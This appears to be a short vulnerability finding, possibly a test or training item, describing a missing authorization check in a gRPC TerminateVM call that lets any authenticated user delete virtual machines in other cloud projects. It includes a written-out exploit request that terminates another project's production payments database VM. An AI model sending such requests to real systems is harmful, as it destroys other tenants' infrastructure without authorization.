diagnosis: The TerminateVM RPC accepts project_id and vm_id directly from the client request and deletes the virtual machine without ensuring that the authenticated gRPC caller has permission over the target project. An authenticated user can delete critical production servers belonging to other cloud projects.
exploit_request:
GRPC /compute.v1.ComputeService/TerminateVM
Host: grpc.cloud-platform.internal:9090
Metadata: authorization: Bearer user_jwt_project_beta

{"project_id": "proj_prod_payments", "vm_id": "vm_primary_db"}
